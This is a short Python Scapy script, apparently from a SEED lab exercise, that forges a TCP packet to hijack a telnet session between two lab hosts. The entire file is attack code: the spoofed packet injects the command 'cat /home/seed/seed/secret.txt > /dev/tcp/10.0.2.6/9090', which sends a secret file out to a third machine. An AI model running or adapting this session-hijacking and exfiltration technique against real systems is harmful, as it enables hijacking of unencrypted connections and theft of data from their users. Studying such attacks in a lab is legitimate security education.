#!/user/bin/python3
import sys
from scapy.all import *

print("Sending session hijacking packet....")
IPLayer = IP(src = "10.0.2.4", dst = "10.0.2.5")
TCPLayer = TCP(sport=51804, dport=23, flags="A", seq=3716097421, ack=3918590045)
Data = "\r cat /home/seed/seed/secret.txt > /dev/tcp/10.0.2.6/9090\r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt, verbose=0)
